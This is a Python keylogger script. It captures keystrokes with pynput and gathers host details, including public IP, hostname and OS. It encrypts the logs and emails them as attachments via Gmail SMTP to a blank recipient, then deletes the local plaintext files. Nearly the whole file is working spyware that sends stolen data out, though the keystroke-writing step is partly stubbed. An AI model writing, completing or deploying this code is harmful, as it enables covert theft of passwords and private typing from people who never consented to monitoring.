# Importing Libraries

# for Emailing the findings to us
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from fileinput import filename
import smtplib

# for Connection
import socket
# for information
import platform

# for catching key presses
from pynput.keyboard import Key, Listener

import time
import os

# for encrypting the files
from cryptography.fernet import Fernet

# for user info
import getpass

# for http requests
import requests


# File names
# ----------

key_info = "keylog.txt"
system_info = "sysinfo.txt"

key_info_encrypted = "keylog_enc.txt"
system_info_encrypted = "sysinfo_enc.txt"

time_iteration = 15
number_of_iterations_end = 3


# Email (disposable) for sending the mail
# -----------------------------------------

email_address = ""
password = ""

username = getpass.getuser()

# Reciever Details
# ----------------

to_addr = ""
key = ""  # this will be generated using generate_key script

with open("encryption_key.txt", "r") as f:
    key = f.read()
    print("Key Read complete successfully ✅")

# File path setter
# ----------------

file_path = "./"
extend = "//"
file_merge = file_path + extend

# Send email function
# -------------------


def sendmail(file_name, attachment, to_addr):
    from_addr = email_address
    msg = MIMEMultipart()
    msg['From'] = from_addr
    msg['To'] = to_addr
    msg['Subject'] = "Sys Files"
    body = f"Files sent to you from {from_addr}"
    msg.attach(MIMEText(body, 'plain'))
    filename = file_name
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f"attachment; filename={file_name}")
    msg.attach(p)

    # SMTP server
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(from_addr, password)
    text = msg.as_string()
    s.sendmail(from_addr, to_addr, text)
    s.quit()


# Sending the keylogger file
# sendmail(key_info, file_path + extend + key_info, to_addr)

# Getting the Computer information
# --------------------------------


def get_computer_info():
    hostname = socket.gethostname()
    IPAddr = socket.gethostbyname(hostname)
    with open(file_path+extend+system_info, "a") as f:
        try:
            public_ip = requests.get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)
        except Exception:
            f.write("Couldn't get Public IP Address")

        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() +
                " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP: " + IPAddr + "\n")
        print("Computer Info Gathered 🖥️")


get_computer_info()


# Keylogger Script
# ----------------

print(f"Keylogger Starting for {number_of_iterations_end} iterations 🚀")

number_of_iterations = 0
current_time = time.time()
stopping_time = time.time() + time_iteration

while number_of_iterations < number_of_iterations_end:

    count = 0
    keys = []

    def write_file_keys(keys):
        with open(file_path + extend + key_info, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write("\n")
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close

    def on_press_key(key):
        global keys, count, current_time
        print(key)
        keys.append(key)
        count += 1
        current_time = time.time()

        if count >= 1:
            count = 0
            pass  # write file function
            keys = []

    def on_release_key(key):
        if key == Key.esc:
            return False
        if current_time > stopping_time:
            return False

    # Starting a listener
    with Listener(on_press=on_press_key, on_release=on_release_key) as listener:
        listener.join()

    if current_time > stopping_time:
        with open(file_path + extend + key_info, "w") as f:
            f.write(" ")


# Encrypting the Files
files_to_encrypt = [file_merge + system_info, file_merge + key_info]
encrypted_file_names = [file_merge + system_info_encrypted,
                        file_merge + key_info_encrypted]

count = 0

print("Encryption Started ⏳")

for enc_files in files_to_encrypt:
    with open(files_to_encrypt[count], "rb") as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], "wb") as f:
        f.write(encrypted)

    sendmail(encrypted_file_names[count], encrypted_file_names[count], to_addr)
    count += 1

print("Encryption Done and files mailed to the account 📬")

time.sleep(120)


# Delete Unencrypted files
# ------------------------

files_to_delete = [key_info, system_info]
for file in files_to_delete:
    os.remove(file_merge + file)
